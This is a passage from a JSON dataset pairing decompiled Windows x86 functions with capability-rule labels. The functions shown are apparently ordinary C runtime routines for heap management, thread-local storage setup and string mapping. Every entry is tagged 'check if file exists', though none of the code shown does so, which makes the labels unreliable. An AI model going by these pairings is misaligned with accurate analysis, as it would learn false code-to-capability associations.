        "decompiled_code": "\nuint fcn.0040f110(int32_t param_1, int32_t param_2, uint param_3)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t extraout_ECX;\n    uchar *puVar4;\n    int32_t iVar5;\n    int32_t iStack12;\n    uint uStack8;\n    \n    puVar4 = &stack0xfffffffc;\n    if ((*(param_1 + 4) & 6) == 0) {\n        iStack12 = param_1;\n        uStack8 = param_3;\n        *(param_2 + -4) = &iStack12;\n        iVar5 = *(param_2 + 0xc);\n        iVar3 = *(param_2 + 8);\n        iVar2 = fcn.00415a6c(param_2);\n        if (iVar2 == 0) {\n            *(param_1 + 4) = *(param_1 + 4) | 8;\n        }\n        else {\n            for (; iVar5 != -1; iVar5 = *(iVar3 + iVar5 * 0xc)) {\n                pcVar1 = *(iVar3 + 4 + iVar5 * 0xc);\n                if (pcVar1 != NULL) {\n                    iVar3 = (*pcVar1)();\n                    param_2 = *(puVar4 + 0xc);\n                    if (iVar3 != 0) {\n                        if (iVar3 < 0) {\n                            return 0;\n                        }\n                        iVar3 = *(param_2 + 8);\n                        fcn.0040b4e8(param_2);\n                        puVar4 = param_2 + 0x10;\n                        fcn.0040b52a(param_2, iVar5);\n                        fcn.0040b5be(1);\n                        *(param_2 + 0xc) = *(iVar3 + extraout_ECX * 4);\n                        param_2 = 0;\n                        iVar5 = 0;\n                        (**(iVar3 + 8 + extraout_ECX * 4))();\n                    }\n                }\n                iVar3 = *(param_2 + 8);\n            }\n        }\n    }\n    else {\n        fcn.0040b52a(param_2, 0xffffffff, &stack0xfffffffc, &stack0xfffffffc);\n    }\n    return 1;\n}\n",
        "token_count": 519
    },
    "0040f232": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.0040f232(void)\n\n{\n    int32_t arg_8h;\n    code *pcVar1;\n    int32_t *piVar2;\n    \n    if (*0x4418e8 != -1) {\n        (**0x442a4c)(*0x4418e8);\n        *0x4418e8 = -1;\n    }\n    pcVar1 = _sym.imp.KERNEL32.dll_DeleteCriticalSection;\n    piVar2 = 0x4417c8;\n    do {\n        arg_8h = *piVar2;\n        if ((arg_8h != 0) && (piVar2[1] != 1)) {\n            (*pcVar1)(arg_8h);\n            fcn.0040cfb5(arg_8h);\n            *piVar2 = 0;\n        }\n        piVar2 = piVar2 + 2;\n    } while (piVar2 < 0x4418e8);\n    piVar2 = 0x4417c8;\n    do {\n        if ((*piVar2 != 0) && (piVar2[1] == 1)) {\n            (*pcVar1)(*piVar2);\n        }\n        piVar2 = piVar2 + 2;\n    } while (piVar2 < 0x4418e8);\n    return;\n}\n",
        "token_count": 295
    },
    "0040f455": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint fcn.0040f455(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint uVar4;\n    \n    iVar2 = fcn.0040ef1d();\n    if (iVar2 == 0) {\n        fcn.0040f232();\n        return 0;\n    }\n    iVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(\"kernel32.dll\");\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcAddress;\n    if (iVar2 != 0) {\n        *0x442a40 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, \"FlsAlloc\");\n        *0x442a44 = (*pcVar1)(iVar2, \"FlsGetValue\");\n        *0x442a48 = (*pcVar1)(iVar2, \"FlsSetValue\");\n        *0x442a4c = (*pcVar1)(iVar2, \"FlsFree\");\n        if (*0x442a44 == 0) {\n            *0x442a44 = _sym.imp.KERNEL32.dll_TlsGetValue;\n            *0x442a48 = _sym.imp.KERNEL32.dll_TlsSetValue;\n            *0x442a40 = 0x40f229;\n            *0x442a4c = _sym.imp.KERNEL32.dll_TlsFree;\n        }\n    }\n    *0x4418e8 = (**0x442a40)(fcn.0040f2d3);\n    if (((*0x4418e8 != -1) && (puVar3 = fcn.004130d3(1, 0x8c),  puVar3 != NULL)) &&\n       (iVar2 = (**0x442a48)(*0x4418e8, puVar3),  iVar2 != 0)) {\n        puVar3[0x15] = 0x4419a8;\n        puVar3[5] = 1;\n        uVar4 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n        puVar3[1] = 0xffffffff;\n        *puVar3 = uVar4;\n        return 1;\n    }\n    fcn.0040f232();\n    return 0;\n}\n",
        "token_count": 496
    },
    "0040fa1b": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_40h\n\nvoid __cdecl\nfcn.0040fa1b(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint noname_15, uint noname_16, uint noname_17, uint noname_18, uint noname_19, \n            uint noname_20, uint noname_21, uint noname_22, uint noname_23, uint arg_8h, uint noname_25, \n            uint lpWideCharStr, uint arg_14h, uint noname_28, uint noname_29, uint CodePage)\n\n{\n    int32_t iVar1;\n    int16_t *piVar2;\n    uchar *arg_8h_00;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    uint var_34h;\n    uint Locale;\n    uint dwMapFlags;\n    uint lpSrcStr;\n    uint cchSrc;\n    uint lpDestStr;\n    uint cchDest;\n    uint var_18h_2;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_20h_3;\n    uint var_4h;\n    uint uVar4;\n    uint uVar5;\n    uint uStack72;\n    uint uStack68;\n    uint uStack64;\n    uint uStack60;\n    uint var_34h_2;\n    uint uStack52;\n    uint var_2ch_3;\n    uint var_28h_3;\n    uint var_24h_3;\n    uint var_20h_4;\n    uint var_1ch_2;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint var_40h;\n    uint var_4h_2;\n    uint uStack4;\n    \n    uStack4 = 0x24;\n    var_4h_2 = 0x43b8c8;\n    var_40h = 0x40fa27;\n    fcn.0040f0bc();\n    if (*0x442a54 == 0) {\n        var_40h = 0;\n        uStack16 = 0;\n        uStack20 = 1;\n        uStack24 = 0x43b30c;\n        uStack28 = 0x100;\n        var_1ch_2 = 0;\n        var_20h_4 = 0x40fa48;\n        iVar1 = (*_sym.imp.KERNEL32.dll_LCMapStringW)();\n        if (iVar1 == 0) {\n            var_40h = 0x40fa5a;\n            iVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            if (iVar1 == 0x78) {\n                *0x442a54 = 2;\n            }\n        }\n        else {\n            *0x442a54 = 1;\n        }\n    }\n    if (0 < *(unaff_EBP + 0x14)) {\n        iVar1 = *(unaff_EBP + 0x14);\n        piVar2 = *(unaff_EBP + 0x10);\n        do {\n            iVar1 = iVar1 + -1;\n            if (*piVar2 == 0) goto code_r0x0040fa83;\n            piVar2 = piVar2 + 1;\n        } while (iVar1 != 0);\n        iVar1 = -1;\ncode_r0x0040fa83:\n        *(unaff_EBP + 0x14) = *(unaff_EBP + 0x14) + (-1 - iVar1);\n    }\n    if (*0x442a54 == 1) {\n        var_40h = *(unaff_EBP + 0x1c);\n        uStack16 = *(unaff_EBP + 0x18);\n        uStack20 = *(unaff_EBP + 0x14);\n        uStack24 = *(unaff_EBP + 0x10);\n        uStack28 = *(unaff_EBP + 0xc);\n        var_1ch_2 = *(unaff_EBP + 8);\n        var_20h_4 = 0x40faac;\n        (*_sym.imp.KERNEL32.dll_LCMapStringW)();\n        goto code_r0x0040fc6b;\n    }\n    if ((*0x442a54 != 2) && (*0x442a54 != 0)) goto code_r0x0040fc6b;\n    *(unaff_EBP + -0x24) = 0;\n    *(unaff_EBP + -0x2c) = 0;\n    *(unaff_EBP + -0x28) = 0;\n    if (*(unaff_EBP + 8) == 0) {\n        *(unaff_EBP + 8) = *0x442bf0;\n    }\n    if (*(unaff_EBP + 0x20) == 0) {\n        *(unaff_EBP + 0x20) = *0x442c00;\n    }\n    var_40h = *(unaff_EBP + 8);\n    uStack16 = 0x40fae5;\n    iVar1 = fcn.00415600(var_40h);\n    if ((*(unaff_EBP + 0x20) != iVar1) && (iVar1 != -1)) {\n        *(unaff_EBP + 0x20) = iVar1;\n    }\n    var_40h = 0;\n    uStack16 = 0;\n    uStack20 = 0;\n    uStack24 = 0;\n    uStack28 = *(unaff_EBP + 0x14);\n    var_1ch_2 = *(unaff_EBP + 0x10);\n    var_20h_4 = 0;\n    var_24h_3 = *(unaff_EBP + 0x20);\n    var_28h_3 = 0x40fb07;\n    iVar1 = (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)();\n    *(unaff_EBP + -0x20) = iVar1;\n    if (iVar1 == 0) goto code_r0x0040fc6b;\n    *(unaff_EBP + -4) = 0;\n    var_28h_3 = 0x40fb23;\n    fcn.0040fc80();\n    *(unaff_EBP + -0x18) = &fcn.0040fa1b::var_24h_3;\n    *(unaff_EBP + -0x1c) = &fcn.0040fa1b::var_24h_3;\n    *(unaff_EBP + -4) = 0xffffffff;\n    if (*(unaff_EBP + -0x1c) == 0) {\n        var_28h_3 = *(unaff_EBP + -0x20);\n        var_2ch_3 = 0x40fb56;\n        iVar1 = fcn.0040b8de();\n        *(unaff_EBP + -0x1c) = iVar1;\n        if (iVar1 == 0) goto code_r0x0040fc6b;\n        *(unaff_EBP + -0x2c) = 1;\n    }\n    var_28h_3 = 0;\n    var_2ch_3 = 0;\n    uStack52 = *(unaff_EBP + -0x20);\n    var_34h_2 = *(unaff_EBP + -0x1c);\n    uStack60 = *(unaff_EBP + 0x14);\n    uStack64 = *(unaff_EBP + 0x10);\n    uStack68 = 0;\n    uStack72 = *(unaff_EBP + 0x20);\n    iVar1 = (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)();\n    if (iVar1 == 0) {\ncode_r0x0040fc4b:\n        arg_8h_00 = *(unaff_EBP + -0x34);\n    }\n    else {\n        arg_8h_00 = &stack0xffffffb8;\n        iVar1 = (*_sym.imp.KERNEL32.dll_LCMapStringA)\n                          (*(unaff_EBP + 8), *(unaff_EBP + 0xc), *(unaff_EBP + -0x1c), *(unaff_EBP + -0x20), 0, 0);\n        *(unaff_EBP + -0x30) = iVar1;\n        if (iVar1 == 0) goto code_r0x0040fc4b;\n        *(unaff_EBP + -4) = 1;\n        fcn.0040fc80();\n        *(unaff_EBP + -0x18) = &stack0xffffffb8;\n        *(unaff_EBP + -0x34) = &stack0xffffffb8;\n        *(unaff_EBP + -4) = 0xffffffff;\n        if (*0x10 == 0x48) {\n            arg_8h_00 = fcn.0040b8de(iVar1);\n            if (arg_8h_00 != NULL) {\n                *(unaff_EBP + -0x28) = 1;\n                goto code_r0x0040fbed;\n            }\n        }\n        else {\ncode_r0x0040fbed:\n            iVar3 = (*_sym.imp.KERNEL32.dll_LCMapStringA)\n                              (*(unaff_EBP + 8), *(unaff_EBP + 0xc), *(unaff_EBP + -0x1c), *(unaff_EBP + -0x20), \n                               arg_8h_00, iVar1);\n            if (iVar3 != 0) {\n                if ((*(unaff_EBP + 0xd) & 4) == 0) {\n                    if (*(unaff_EBP + 0x1c) == 0) {\n                        uVar5 = 0;\n                        uVar4 = 0;\n                    }\n                    else {\n                        uVar5 = *(unaff_EBP + 0x1c);\n                        uVar4 = *(unaff_EBP + 0x18);\n                    }\n                    uVar5 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)\n                                      (*(unaff_EBP + 0x20), 1, arg_8h_00, iVar1, uVar4, uVar5);\n                    *(unaff_EBP + -0x24) = uVar5;\n                }\n                else {\n                    *(unaff_EBP + -0x24) = iVar1;\n                    if (*(unaff_EBP + 0x1c) != 0) {\n                        if (*(unaff_EBP + 0x1c) < iVar1) {\n                            iVar1 = *(unaff_EBP + 0x1c);\n                        }\n                        fcn.004149a0(*(unaff_EBP + 0x18), arg_8h_00, iVar1);\n                    }\n                }\n            }\n        }\n    }\n    if (*(unaff_EBP + -0x28) != 0) {\n        fcn.0040cfb5(arg_8h_00);\n    }\n    if (*(unaff_EBP + -0x2c) != 0) {\n        fcn.0040cfb5(*(unaff_EBP + -0x1c));\n    }\ncode_r0x0040fc6b:\n    *(unaff_EBP + -0x44) = 0x40fc73;\n    fcn.0040f0f7();\n    return;\n}\n",
        "token_count": 2677
    },
    "0040fe35": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040fe35(uint32_t *arg_8h, int32_t arg_ch)\n\n{\n    int32_t *piVar1;\n    char *pcVar2;\n    uint32_t *puVar3;\n    int32_t *piVar4;\n    char cVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    code *pcVar8;\n    uint8_t uVar9;\n    uint32_t uVar10;\n    uint32_t *puVar11;\n    uint32_t *puVar12;\n    uint32_t *puVar13;\n    uint32_t uVar14;\n    uint32_t uVar15;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    uVar6 = arg_8h[4];\n    puVar13 = arg_ch + -4;\n    uVar15 = arg_ch - arg_8h[3] >> 0xf;\n    piVar4 = uVar15 * 0x204 + 0x144 + uVar6;\n    var_4h = *puVar13 - 1;\n    if ((var_4h & 1) == 0) {\n        puVar11 = var_4h + puVar13;\n        uVar14 = *puVar11;\n        uVar7 = *(arg_ch + -8);\n        if ((uVar14 & 1) == 0) {\n            uVar10 = (uVar14 >> 4) - 1;\n            if (0x3f < uVar10) {\n                uVar10 = 0x3f;\n            }\n            if (puVar11[1] == puVar11[2]) {\n                if (uVar10 < 0x20) {\n                    pcVar2 = uVar10 + 4 + uVar6;\n                    uVar10 = ~(0x80000000U >> (uVar10 & 0x1f));\n                    puVar12 = uVar6 + 0x44 + uVar15 * 4;\n                    *puVar12 = *puVar12 & uVar10;\n                    *pcVar2 = *pcVar2 + -1;\n                    if (*pcVar2 == '\\0') {\n                        *arg_8h = *arg_8h & uVar10;\n                    }\n                }\n                else {\n                    pcVar2 = uVar10 + 4 + uVar6;\n                    uVar10 = ~(0x80000000U >> (uVar10 - 0x20 & 0x1f));\n                    puVar12 = uVar6 + 0xc4 + uVar15 * 4;\n                    *puVar12 = *puVar12 & uVar10;\n                    *pcVar2 = *pcVar2 + -1;\n                    if (*pcVar2 == '\\0') {\n                        arg_8h[1] = arg_8h[1] & uVar10;\n                    }\n                }\n            }\n            var_4h = var_4h + uVar14;\n            *(puVar11[2] + 4) = puVar11[1];\n            *(puVar11[1] + 8) = puVar11[2];\n        }\n        puVar11 = (var_4h >> 4) + -1;\n        if (0x3f < puVar11) {\n            puVar11 = 0x3f;\n        }\n        puVar12 = arg_8h;\n        if ((uVar7 & 1) == 0) {\n            puVar13 = puVar13 - uVar7;\n            puVar12 = (uVar7 >> 4) + -1;\n            if (0x3f < puVar12) {\n                puVar12 = 0x3f;\n            }\n            var_4h = var_4h + uVar7;\n            puVar11 = (var_4h >> 4) + -1;\n            if (0x3f < puVar11) {\n                puVar11 = 0x3f;\n            }\n            if (puVar12 != puVar11) {\n                if (puVar13[1] == puVar13[2]) {\n                    if (puVar12 < 0x20) {\n                        uVar14 = ~(0x80000000U >> (puVar12 & 0x1f));\n                        puVar3 = uVar6 + 0x44 + uVar15 * 4;\n                        *puVar3 = *puVar3 & uVar14;\n                        pcVar2 = puVar12 + uVar6 + 4;\n                        *pcVar2 = *pcVar2 + -1;\n                        if (*pcVar2 == '\\0') {\n                            *arg_8h = *arg_8h & uVar14;\n                        }\n                    }\n                    else {\n                        uVar14 = ~(0x80000000U >> (puVar12 - 0x20 & 0x1f));\n                        puVar3 = uVar6 + 0xc4 + uVar15 * 4;\n                        *puVar3 = *puVar3 & uVar14;\n                        pcVar2 = puVar12 + uVar6 + 4;\n                        *pcVar2 = *pcVar2 + -1;\n                        if (*pcVar2 == '\\0') {\n                            arg_8h[1] = arg_8h[1] & uVar14;\n                        }\n                    }\n                }\n                *(puVar13[2] + 4) = puVar13[1];\n                *(puVar13[1] + 8) = puVar13[2];\n            }\n        }\n        if (((uVar7 & 1) != 0) || (puVar12 != puVar11)) {\n            piVar1 = piVar4 + puVar11 * 2;\n            uVar14 = piVar1[1];\n            puVar13[2] = piVar1;\n            puVar13[1] = uVar14;\n            piVar1[1] = puVar13;\n            *(puVar13[1] + 8) = puVar13;\n            if (puVar13[1] == puVar13[2]) {\n                cVar5 = *(puVar11 + uVar6 + 4);\n                *(puVar11 + uVar6 + 4) = cVar5 + '\\x01';\n                uVar9 = puVar11;\n                if (puVar11 < 0x20) {\n                    if (cVar5 == '\\0') {\n                        *arg_8h = *arg_8h | 0x80000000U >> (uVar9 & 0x1f);\n                    }\n                    puVar11 = uVar6 + 0x44 + uVar15 * 4;\n                    *puVar11 = *puVar11 | 0x80000000U >> (uVar9 & 0x1f);\n                }\n                else {\n                    if (cVar5 == '\\0') {\n                        arg_8h[1] = arg_8h[1] | 0x80000000U >> (uVar9 - 0x20 & 0x1f);\n                    }\n                    puVar11 = uVar6 + 0xc4 + uVar15 * 4;\n                    *puVar11 = *puVar11 | 0x80000000U >> (uVar9 - 0x20 & 0x1f);\n                }\n            }\n        }\n        *puVar13 = var_4h;\n        *((var_4h - 4) + puVar13) = var_4h;\n        *piVar4 = *piVar4 + -1;\n        pcVar8 = _sym.imp.KERNEL32.dll_VirtualFree;\n        if (*piVar4 == 0) {\n            if (*0x4431d0 != NULL) {\n                (*_sym.imp.KERNEL32.dll_VirtualFree)(*0x4431e8 * 0x8000 + (*0x4431d0)[3], 0x8000, 0x4000);\n                (*0x4431d0)[2] = (*0x4431d0)[2] | 0x80000000U >> (*0x4431e8 & 0x1f);\n                *((*0x4431d0)[4] + 0xc4 + *0x4431e8 * 4) = 0;\n                *((*0x4431d0)[4] + 0x43) = *((*0x4431d0)[4] + 0x43) + -1;\n                if (*((*0x4431d0)[4] + 0x43) == '\\0') {\n                    (*0x4431d0)[1] = (*0x4431d0)[1] & 0xfffffffe;\n                }\n                if ((*0x4431d0)[2] == 0xffffffff) {\n                    (*pcVar8)((*0x4431d0)[3], 0, 0x8000);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(*0x4431ec, 0, (*0x4431d0)[4]);\n                    fcn.0040ada0(*0x4431d0, *0x4431d0 + 5, (*0x4431d4 * 0x14 - *0x4431d0) + -0x14 + *0x4431d8);\n                    *0x4431d4 = *0x4431d4 + -1;\n                    if (*0x4431d0 < arg_8h) {\n                        arg_8h = arg_8h + -5;\n                    }\n                    *0x4431e0 = *0x4431d8;\n                }\n            }\n            *0x4431d0 = arg_8h;\n            *0x4431e8 = uVar15;\n        }\n    }\n    return;\n}\n",
        "token_count": 2188
    },
    "004106ba": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint fcn.004106ba(void)\n\n{\n    int32_t **ppiVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t **ppiVar4;\n    uint32_t uVar5;\n    int32_t *piVar6;\n    int32_t **ppiVar7;\n    int32_t iVar8;\n    int32_t **ppiVar9;\n    int32_t **ppiVar10;\n    uint32_t *puVar11;\n    uint32_t *puVar12;\n    uint *puVar13;\n    bool bVar14;\n    uint var_138h;\n    uint32_t *var_38h;\n    uint32_t *var_34h;\n    int32_t **var_30h;\n    int32_t **var_2ch;\n    uint32_t var_28h;\n    int32_t **var_24h;\n    uint32_t var_20h;\n    int32_t var_1ch;\n    uint32_t var_18h;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    int32_t **var_8h;\n    int32_t *var_4h;\n    \n    iVar3 = (*_sym.imp.KERNEL32.dll_IsBadWritePtr)(*0x4431d8, *0x4431d4 * 0x14);\n    if (iVar3 != 0) {\n        return 0xffffffff;\n    }\n    var_1ch = 0;\n    puVar11 = *0x4431d8;\n    if (0 < *0x4431d4) {\n        do {\n            uVar5 = puVar11[4];\n            var_34h = puVar11;\n            iVar3 = (*_sym.imp.KERNEL32.dll_IsBadWritePtr)(uVar5, 0x41c4);\n            if (iVar3 != 0) {\n                return 0xfffffffe;\n            }\n            var_8h = puVar11[3];\n            var_24h = uVar5 + 0x144;\n            var_20h = puVar11[2];\n            puVar12 = uVar5 + 0xc4;\n            var_10h = 0;\n            var_14h = 0;\n            var_ch = 0;\n            do {\n                var_28h = 0;\n                var_18h = 0;\n                var_4h = NULL;\n                bVar14 = -1 < var_20h;\n                puVar13 = &var_138h;\n                var_38h = puVar12;\n                for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n                    *puVar13 = 0;\n                    puVar13 = puVar13 + 1;\n                }\n                if (bVar14) {\n                    iVar3 = (*_sym.imp.KERNEL32.dll_IsBadWritePtr)(var_8h, 0x8000);\n                    if (iVar3 != 0) {\n                        return 0xfffffffc;\n                    }\n                    iVar3 = 0;\n                    ppiVar9 = var_8h + 0x3ff;\n                    do {\n                        ppiVar4 = ppiVar9 + -0x3fc;\n                        if ((ppiVar9[-0x3fd] != 0xffffffff) || (*ppiVar9 != 0xffffffff)) {\n                            return 0xfffffffb;\n                        }\n                        do {\n                            piVar2 = *ppiVar4;\n                            if ((piVar2 & 1) == 0) {\n                                iVar8 = (piVar2 >> 4) + -1;\n                                if (0x3f < iVar8) {\n                                    iVar8 = 0x3f;\n                                }\n                                (&var_138h)[iVar8] = (&var_138h)[iVar8] + 1;\n                                piVar6 = piVar2;\n                            }\n                            else {\n                                if (0x400 < piVar2 - 1U) {\n                                    return 0xfffffffa;\n                                }\n                                var_4h = var_4h + 1;\n                                piVar6 = piVar2 - 1U;\n                            }\n                            if (((piVar6 < 0x10) || ((piVar6 & 0xf) != 0)) || (0xff0 < piVar6)) {\n                                return 0xfffffff9;\n                            }\n                            ppiVar4 = piVar6 + ppiVar4;\n                            if (ppiVar4[-1] != piVar2) {\n                                return 0xfffffff8;\n                            }\n                        } while (ppiVar4 < ppiVar9);\n                        if (ppiVar4 != ppiVar9) {\n                            return 0xfffffff8;\n                        }\n                        ppiVar9 = ppiVar9 + 0x400;\n                        iVar3 = iVar3 + 1;\n                    } while (iVar3 < 8);\n                    if (*var_24h != var_4h) {\n                        return 0xfffffff7;\n                    }\n                    iVar3 = 0;\n                    ppiVar9 = var_24h;\n                    do {\n                        var_4h = NULL;\n                        var_30h = ppiVar9 + 2;\n                        ppiVar4 = ppiVar9[1];\n                        var_2ch = ppiVar9;\n                        ppiVar10 = var_30h;\n                        if (ppiVar4 != ppiVar9) {\n                            do {\n                                if (var_4h == (&var_138h)[iVar3]) break;\n                                if ((ppiVar4 < var_8h) || (var_8h + 0x2000 <= ppiVar4)) {\n                                    return 0xfffffff6;\n                                }\n                                ppiVar7 = (ppiVar4 & 0xfffff000) + 0xc;\n                                ppiVar1 = (ppiVar4 & 0xfffff000) + 0xffc;\n                                if (ppiVar7 == ppiVar1) {\n                                    return 0xfffffff5;\n                                }\n                                do {\n                                    if (ppiVar7 == ppiVar4) break;\n                                    ppiVar7 = ppiVar7 + (*ppiVar7 & 0xfffffffe);\n                                    ppiVar10 = var_30h;\n                                } while (ppiVar7 != ppiVar1);\n                                if (ppiVar7 == ppiVar1) {\n                                    return 0xfffffff5;\n                                }\n                                iVar8 = (*ppiVar4 >> 4) + -1;\n                                if (0x3f < iVar8) {\n                                    iVar8 = 0x3f;\n                                }\n                                if (iVar8 != iVar3) {\n                                    return 0xfffffff4;\n                                }\n                                if (ppiVar4[2] != var_2ch) {\n                                    return 0xfffffff3;\n                                }\n                                var_4h = var_4h + 1;\n                                var_2ch = ppiVar4;\n                                ppiVar4 = ppiVar4[1];\n                            } while (ppiVar4 != ppiVar9);\n                            if (var_4h != NULL) {\n                                if (iVar3 < 0x20) {\n                                    uVar5 = 0x80000000 >> (iVar3 & 0x1f);\n                                    var_28h = var_28h | uVar5;\n                                    var_10h = var_10h | uVar5;\n                                }\n                                else {\n                                    uVar5 = 0x80000000 >> (iVar3 - 0x20 & 0x1f);\n                                    var_18h = var_18h | uVar5;\n                                    var_14h = var_14h | uVar5;\n                                }\n                            }\n                        }\n                        if ((var_2ch[1] != ppiVar9) || (var_4h != (&var_138h)[iVar3])) {\n                            return 0xfffffff2;\n                        }\n                        if (*ppiVar10 != var_2ch) {\n                            return 0xfffffff1;\n                        }\n                        iVar3 = iVar3 + 1;\n                        puVar11 = var_34h;\n                        puVar12 = var_38h;\n                        ppiVar9 = ppiVar10;\n                    } while (iVar3 < 0x40);\n                }\n                if ((var_28h != puVar12[-0x20]) || (var_18h != *puVar12)) {\n                    return 0xfffffff0;\n                }\n                var_8h = var_8h + 0x2000;\n                var_24h = var_24h + 0x81;\n                var_20h = var_20h << 1;\n                var_ch = var_ch + 1;\n                puVar12 = puVar12 + 1;\n            } while (var_ch < 0x20);\n            if ((var_10h != *puVar11) || (var_14h != puVar11[1])) {\n                return 0xffffffef;\n            }\n            puVar11 = puVar11 + 5;\n            var_1ch = var_1ch + 1;\n            var_38h = puVar12;\n        } while (var_1ch < *0x4431d4);\n    }\n    return 0;\n}\n",
        "token_count": 2023
    },
    "00410a2e": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.00410a2e(uint32_t *arg_8h)\n\n{\n    int32_t *piVar1;\n    char *pcVar2;\n    int32_t *piVar3;\n    char cVar4;\n    int32_t *piVar5;\n    uint uVar6;\n    uint8_t uVar7;\n    uint32_t uVar8;\n    int32_t iVar9;\n    uint32_t *puVar10;\n    int32_t iVar11;\n    uint32_t uVar12;\n    int32_t *piVar13;\n    uint32_t *puVar14;\n    uint32_t *puVar15;\n    uint32_t uVar16;\n    int32_t iVar17;\n    bool bVar18;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    uVar8 = arg_8h + 0x17U & 0xfffffff0;\n    iVar9 = (arg_8h + 0x17U >> 4) + -1;\n    puVar10 = *0x4431d8 + *0x4431d4 * 5;\n    uVar7 = iVar9;\n    if (iVar9 < 0x20) {\n        uVar16 = 0xffffffff >> (uVar7 & 0x1f);\n        var_8h = 0xffffffff;\n    }\n    else {\n        uVar16 = 0;\n        var_8h = 0xffffffff >> (uVar7 - 0x20 & 0x1f);\n    }\n    bVar18 = *0x4431e0 < puVar10;\n    arg_8h = *0x4431e0;\n    while ((bVar18 && ((arg_8h[1] & var_8h | *arg_8h & uVar16) == 0))) {\n        arg_8h = arg_8h + 5;\n        bVar18 = arg_8h < puVar10;\n    }\n    puVar14 = *0x4431d8;\n    if (arg_8h == puVar10) {\n        for (; (puVar14 < *0x4431e0 && ((puVar14[1] & var_8h | *puVar14 & uVar16) == 0)); puVar14 = puVar14 + 5) {\n        }\n        arg_8h = puVar14;\n        if (puVar14 == *0x4431e0) {\n            for (; (puVar14 < puVar10 && (puVar14[2] == 0)); puVar14 = puVar14 + 5) {\n            }\n            puVar15 = *0x4431d8;\n            arg_8h = puVar14;\n            if (puVar14 == puVar10) {\n                for (; (puVar15 < *0x4431e0 && (puVar15[2] == 0)); puVar15 = puVar15 + 5) {\n                }\n                arg_8h = puVar15;\n                if ((puVar15 == *0x4431e0) && (arg_8h = fcn.0041014d(),  arg_8h == NULL)) {\n                    return NULL;\n                }\n            }\n            uVar6 = fcn.00410204(arg_8h);\n            *arg_8h[4] = uVar6;\n            if (*arg_8h[4] == -1) {\n                return NULL;\n            }\n        }\n    }\n    piVar5 = arg_8h[4];\n    var_4h = *piVar5;\n    if ((var_4h == -1) || ((piVar5[var_4h + 0x31] & var_8h | piVar5[var_4h + 0x11] & uVar16) == 0)) {\n        var_4h = 0;\n        puVar10 = piVar5 + 0x11;\n        uVar12 = piVar5[0x31] & var_8h | *puVar10 & uVar16;\n        while (uVar12 == 0) {\n            puVar14 = puVar10 + 0x21;\n            var_4h = var_4h + 1;\n            puVar10 = puVar10 + 1;\n            uVar12 = *puVar14 & var_8h | *puVar10 & uVar16;\n        }\n    }\n    piVar3 = piVar5 + var_4h * 0x81 + 0x51;\n    iVar9 = 0;\n    uVar16 = piVar5[var_4h + 0x11] & uVar16;\n    if (uVar16 == 0) {\n        uVar16 = piVar5[var_4h + 0x31] & var_8h;\n        iVar9 = 0x20;\n    }\n    for (; -1 < uVar16; uVar16 = uVar16 << 1) {\n        iVar9 = iVar9 + 1;\n    }\n    piVar13 = piVar3[iVar9 * 2 + 1];\n    iVar11 = *piVar13 - uVar8;\n    iVar17 = (iVar11 >> 4) + -1;\n    if (0x3f < iVar17) {\n        iVar17 = 0x3f;\n    }\n    *0x4431e0 = arg_8h;\n    if (iVar17 != iVar9) {\n        if (piVar13[1] == piVar13[2]) {\n            if (iVar9 < 0x20) {\n                pcVar2 = piVar5 + iVar9 + 4;\n                uVar16 = ~(0x80000000U >> (iVar9 & 0x1f));\n                piVar5[var_4h + 0x11] = uVar16 & piVar5[var_4h + 0x11];\n                *pcVar2 = *pcVar2 + -1;\n                if (*pcVar2 == '\\0') {\n                    *arg_8h = *arg_8h & uVar16;\n                }\n            }\n            else {\n                pcVar2 = piVar5 + iVar9 + 4;\n                uVar16 = ~(0x80000000U >> (iVar9 - 0x20 & 0x1f));\n                piVar5[var_4h + 0x31] = piVar5[var_4h + 0x31] & uVar16;\n                *pcVar2 = *pcVar2 + 